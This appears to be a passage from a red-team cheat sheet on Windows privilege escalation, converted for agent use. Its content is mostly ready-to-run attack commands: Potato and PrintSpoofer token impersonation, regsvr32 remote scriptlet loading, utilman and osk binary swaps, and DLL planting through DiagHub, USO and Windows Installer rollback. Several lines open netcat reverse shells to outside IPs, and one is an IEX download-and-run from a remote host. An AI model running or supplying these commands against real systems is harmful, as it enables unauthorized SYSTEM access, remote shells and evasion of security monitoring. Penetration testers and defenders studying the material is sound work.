<!-- provenance: InternalAllTheThings docs/redteam/escalation/windows-privilege-escalation.md @ 203bb0c | part 4/5: Windows Privilege Escalation - Impersonation and Privileged Files | converted for Agent Skills; see ../../NOTICE.md -->

# Windows Privilege Escalation - Impersonation and Privileged Files

## EoP - From local administrator to NT SYSTEM

```powershell
PsExec.exe -i -s cmd.exe
```

## EoP - Living Off The Land Binaries and Scripts

Living Off The Land Binaries and Scripts (and also Libraries) : [lolbas-project.github.io](https://lolbas-project.github.io)

> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.

A LOLBin/Lib/Script must:

* Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
Have extra "unexpected" functionality. It is not interesting to document intended use cases.
Exceptions are application whitelisting bypasses
* Have functionality that would be useful to an APT or red team

```powershell
wmic.exe process call create calc
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
Microsoft.Workflow.Compiler.exe tests.xml results.xml
```

## EoP - Impersonation Privileges

Full privileges cheatsheet at [gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege              | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                   | Remarks                                                                                                                                                                                                                                                          |
| ---------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SeAssignPrimaryToken` | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                    | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                           |
| `SeBackup`             | **Threat**  | _**Built-in commands**_ | Read sensitve files with `robocopy /b`                                                                                                                                                                                                                                                                                           | - May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter.                        |
| `SeCreateToken`        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                        |                                                                                                                                                                                                                                                                  |
| `SeDebug`              | _**Admin**_ | **PowerShell**          | Duplicate the `lsass.exe` token.                                                                                                                                                                                                                                                                                                 | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)                                                                                                                                           |
| `SeLoadDriver`         | _**Admin**_ | 3rd party tool          | 1. Load buggy kernel driver such as `szkg64.sys` or `capcom.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv`                                                                               | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh) |
| `SeRestore`            | _**Admin**_ | **PowerShell**          | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U | Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.                                                                                                  |
| `SeTakeOwnership`      | _**Admin**_ | _**Built-in commands**_ | 1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U                                                                                                                                                  | Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.                                                                                                  |
| `SeTcb`                | _**Admin**_ | 3rd party tool          | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified.                                                                                                                                                                                                                        |                                                                                                                                                                                                                                                                  |
| `SeRelabel`            | _**Admin**_ | 3rd party too           | [decoder-it/RelabelAbuse](https://github.com/decoder-it/RelabelAbuse)                                                                                                                                                                                                                                                            | Allows you to own resources that have an integrity level even higher than your own                                                                                                                                                                               |

### Restore A Service Account's Privileges

> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.

```powershell
# https://github.com/itm4n/FullPowers

c:\TOOLS>FullPowers
[+] Started dummy thread with id 9976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```

### Meterpreter getsystem and alternatives

```powershell
meterpreter> getsystem 
Tokenvator.exe getsystem cmd.exe 
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
psexec -s -i cmd.exe 
python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
```

### RottenPotato (Token Impersonation)

* Binary available at : [foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato) and [breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)
* Exploit using Metasploit with `incognito mode` loaded.

    ```c
    getuid
    getprivs
    use incognito
    list\_tokens -u
    cd c:\temp\
    execute -Hc -f ./rot.exe
    impersonate\_token "NT AUTHORITY\SYSTEM"
    ```

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

### Juicy Potato (Abusing the golden privileges)

> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**
> If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**

* Binary available at : [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases)

1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)

    ```powershell
    whoami /priv
    ```

2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object

    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)

3. Execute JuicyPotato to run a privileged command.

    ```powershell
    JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
    JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
    JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
        ......
        [+] authresult 0
        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
        [+] CreateProcessWithTokenW OK
    ```

### Rogue Potato (Fake OXID Resolver)

* Binary available at [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

```powershell
# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. 
# Use this if you have fw restrictions.
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"

# RoguePotato all in one with RogueOxidResolver running locally on port 9999
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999

#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

### EFSPotato (MS-EFSR EfsRpcOpenFileRaw)

* Binary available at [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)

```powershell
# .NET 4.x
csc EfsPotato.cs
csc /platform:x86 EfsPotato.cs

# .NET 2.0/3.5
C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
```

### JuicyPotatoNG

* [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

```powershell
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
```

### PrintSpoofer (Printer Bug)

> this work if SeImpersonatePrivilege is enabled

* Binary available at [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

```powershell
# run nc -lnvp 443 then :
.\PrintSpoofer64.exe -c "C:\Temp\nc64.exe 192.168.45.171 443 -e cmd"
# without listener
.\PrintSpoofer64.exe -i -c cmd
# Via RPD
.\PrintSpoofer64.exe -d 3 -c "powershell -ep bypass"
```

## EoP - Privileged File Write

### DiagHub

:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.

The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM.
This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory.

#### Exploit

1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
2. Build [xct/diaghub](https://github.com/xct/diaghub)
3. `diaghub.exe c:\\ProgramData\\ payload.dll`

The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`

Alternative tools:

* [Accenture/AARO-Bugs/CVE-2020-5825/TrigDiag](https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag)
* [decoder-it/diaghub_exploit](https://github.com/decoder-it/diaghub_exploit)

### UsoDLLLoader

:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.

> An alternative to the DiagHub DLL loading "exploit" found by James Forshaw (a.k.a. @tiraniddo)

If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of `windowscoredeviceinfo.dll` into `C:\Windows\Sytem32\` and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\System**.

#### Exploit

1. Build [itm4n/UsoDllLoader](https://github.com/itm4n/UsoDllLoader)
    * Select Release config and x64 architecure.
    * Build solution.
        * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
        * Loader .\x64\Release\UsoDllLoader.exe.
2. Copy `WindowsCoreDeviceInfo.dll` to `C:\Windows\System32\`
3. Use the loader and wait for the shell or run `usoclient StartInteractiveScan` and connect to the bind shell on port 1337.

### WerTrigger

> Exploit Privileged File Writes bugs with Windows Problem Reporting

1. Clone [sailay1996/WerTrigger](https://github.com/sailay1996/WerTrigger)
2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
4. Then, run `WerTrigger.exe`.
5. Enjoy a shell as **NT AUTHORITY\SYSTEM**

### WerMgr

> Exploit Privileged Directory Creation Bugs with Windows Error Reporting

1. Clone [binderlabs/DirCreate2System](https://github.com/binderlabs/DirCreate2System)
2. Create directory `C:\Windows\System32\wermgr.exe.local\`
3. Grant access to it: `cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`.
5. Enjoy a shell as **NT AUTHORITY\SYSTEM**

## EoP - Privileged File Delete

During an MSI installation, the Windows Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:

* a folder at `C:\Config.Msi` containing
    * a rollback script (`.rbs`)
    * a rollback file (`.rbf`)

To convert a privileged file delete to a local privilege escalation, you need to abuse the Windows Installer service.

* delete the protected `C:\Config.Msi` folder immediately after it's created by the Windows Installer
* recreate the `C:\Config.Msi` folder with weak DACL permissions since ordinary users are allowed to create folders at the root of `C:\`.
* drop malicious `.rbs` and `.rbf` files into it to be executed by the MSI rollback
* then upon rollback, Windows Installer will make arbitrary changes to the system

The easiest way to trigger this chain is using [thezdi/FilesystemEoPs/FolderOrFileDeleteToSystem](https://github.com/thezdi/PoC/tree/master/FilesystemEoPs/FolderOrFileDeleteToSystem).
The exploit contains a .msi file with 2 actions, the first one produces a delay and the second throws an error to make it rollback. This rollback will "restore" a malicious HID.dll in `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.

Then switch to the secure desktop using `[CTRL]+[ALT]+[DELETE]` and open the On-Screen Keyboard (`osk.exe`).
The `osk.exe` process first looks for the `C:\Program Files\Common Files\microsoft shared\ink\HID.dll` library instead of `C:\Windows\System32\HID.dll`
